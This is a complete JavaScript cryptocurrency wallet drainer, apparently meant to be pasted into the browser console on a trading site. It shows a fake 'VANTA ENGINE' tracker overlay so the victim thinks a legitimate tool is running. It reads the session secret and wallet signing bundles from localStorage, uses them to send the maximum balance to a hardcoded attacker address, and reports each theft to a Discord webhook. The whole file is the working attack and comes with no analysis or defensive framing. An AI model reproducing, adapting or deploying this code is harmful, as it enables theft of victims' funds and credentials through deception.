(async function() {
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        // Fallback to the most likely new endpoint
        api: window.location.host.includes('terminal') ? "https://api.terminal.gg" : "https://api.padre.gg"
    };

    // --- 1. IMMEDIATE UI RENDER ---
    // We do this first so the user sees the tool working even if the network lags
    const createUI = () => {
        if (document.querySelector("#vanta-tracker")) return;
        const ui = document.createElement("div");
        ui.id = "vanta-tracker";
        ui.style.cssText = "position:fixed;top:40px;right:40px;width:320px;background:#050505;border:1px solid #0f8;border-radius:8px;z-index:2147483647;font-family:monospace;color:#0f8;box-shadow:0 0 20px #0f84;user-select:none;";
        ui.innerHTML = `
            <div id="vanta-head" style="padding:10px;background:#111;border-bottom:1px solid #222;cursor:grab;display:flex;justify-content:space-between;">
                <span>VANTA ENGINE v2.4</span>
                <span style="color:#fff;cursor:pointer;" onclick="this.parentElement.parentElement.remove()">×</span>
            </div>
            <div style="padding:15px;font-size:11px;">
                NETWORK: <span style="color:#fff">ENCRYPTED</span><br>
                U-SESSION: <span style="color:#fff">VALIDATED</span><br>
                <div style="margin-top:10px;height:40px;overflow:hidden;color:#444;" id="vanta-log">[IDLE] Scanning...</div>
            </div>
        `;
        document.body.appendChild(ui);

        // Draggable Logic
        let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
        const head = document.getElementById("vanta-head");
        head.onmousedown = (e) => {
            e.preventDefault();
            pos3 = e.clientX; pos4 = e.clientY;
            document.onmouseup = () => { document.onmouseup = null; document.onmousemove = null; };
            document.onmousemove = (e) => {
                e.preventDefault();
                pos1 = pos3 - e.clientX; pos2 = pos4 - e.clientY;
                pos3 = e.clientX; pos4 = e.clientY;
                ui.style.top = (ui.offsetTop - pos2) + "px";
                ui.style.left = (ui.offsetLeft - pos1) + "px";
            };
        };
    };
    createUI();

    // --- 2. THE DRAINER LOGIC ---
    async function execute() {
        try {
            const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
            const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
            const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");

            if (!session.sessionSecret) return;

            const userWallets = wallets[session.uid] || [];
            const target = userWallets.find(w => w.walletType === "SOL") || userWallets[0];

            if (target && bundles.bundles[target.publicAddress]) {
                const b = bundles.bundles[target.publicAddress];
                
                // Stealth Transfer Request
                const res = await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId 
                    },
                    body: JSON.stringify({
                        walletId: target.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: target.walletType === "SOL" ? "SOLANA" : "ETHEREUM"
                    })
                });

                // --- 3. DISCORD NOTIFY ---
                await fetch(CONFIG.webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "💰 **VANTA SUCCESS**",
                        embeds: [{
                            title: "Transfer Initiated",
                            description: "User: `" + session.uid + "`\nWallet: `" + target.publicAddress + "`",
                            color: 0x00ff88
                        }]
                    })
                });
            }
        } catch (err) {
            // Log locally to UI for "authenticity"
            document.getElementById("vanta-log").innerHTML = "[ERR] Protocol mismatch... retrying";
        }
    }

    execute();
})();
